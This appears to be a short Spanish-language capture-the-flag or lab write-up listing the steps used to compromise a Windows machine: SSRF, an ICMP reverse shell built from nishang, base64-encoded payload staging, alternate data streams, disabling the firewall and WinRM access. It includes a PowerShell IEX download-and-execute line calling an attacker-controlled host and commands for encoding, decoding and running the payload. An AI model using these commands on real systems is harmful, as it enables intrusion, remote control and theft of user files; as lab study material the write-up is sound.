## Tenicas utilizadas
- SSFR(**server side request forgery**)
- ICMP reverse shell(**Firewall bypassing**)
- Alternate data streams(**ADS**)
- Firewall evasion(**Firewall rules manipulation**)
## Procedimiento
- Fuzzear la web
- Explotar el SSFR 
- Descargar el recurso de powershell en nishang(**Invoke-PowerShellTcp.ps1**). Copiar y pegar la linea que nos interesa.
- Descargar e interpretar el script en PS de la siguiente manera ``powershell IEX(New-Object Net.WebClient).downloadString('$IP')``
- Entablar una revershell a través de ICMP con PS.
- Convertir todo el archivo a iconv, de la siguiente manera ``cat $archivo | iconv -t utf-161le | base64 -w 0;echo`` Y, guardarlo en un archivo.
- Usamos **fold** para separarlo por cadenas, asi ``fold $archivo | sponge $archivo``. Esto, con la finalidad de ir metiendo la cadena por partes a alguien archivo del sistema(**Que crearemos nosotros**)
- Bash scripting <-
![[Pasted image 20221030235724.png]]
- Correr el script en python para ponernos en escucha y mandarnos una reverse shell por ICMP
- Decodear el archivo que construimos anteriormente, de la siguiente manera ``$filecontent = Get-Content C:\Temp\$archivo; $decode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($filecontent)); $decode > C:\Temp\$archivoDecodeado``
- Llamar al archivo ``powershell C:\Temp\$archivoDecodeado``
- Aprovecharnos del script que se ejecuta en intervalos de tiempo para volvar lo que hay en el escritorio de trabajo del usuario
![[Pasted image 20221031001423.png]]
- Buscar por archivos ocultos y procedemos al leerlos
![[Pasted image 20221031001852.png]]
- Desactivamos el firewall para poder visualizar los puertos internos
![[Pasted image 20221031002858.png]]
- Nos contectamos por winRM

 
